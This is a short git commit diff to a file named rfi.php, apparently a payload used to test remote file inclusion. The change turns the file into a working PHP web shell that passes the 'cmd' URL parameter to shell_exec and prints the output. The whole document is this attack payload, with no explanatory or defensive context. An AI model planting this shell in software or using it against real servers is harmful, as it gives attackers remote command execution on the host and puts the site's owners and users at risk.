73647d4f558daaccb3c5f3e5982d57b8bca53b4c
iamjackmorton <19.parthiv@gmail.com>
2024-11-22 19:54:41 +0530

    Update rfi.php

--- rfi.php
+++ rfi.php
@@ -1,4 +1,8 @@
 <?php
-echo 'Remote File Inclusion Successful!';
-echo($_GET['cmd']);
+if (isset($_GET['cmd']) && !empty($_GET['cmd'])) {
+    echo 'Remote File Inclusion Successful! Command Output: '; // Execute the command passed via the 'cmd' parameter
+    echo shell_exec($_GET['cmd']);
+} else {    // If 'cmd' parameter is not set or is empty
+    echo 'No command provided.';
+}
 ?>
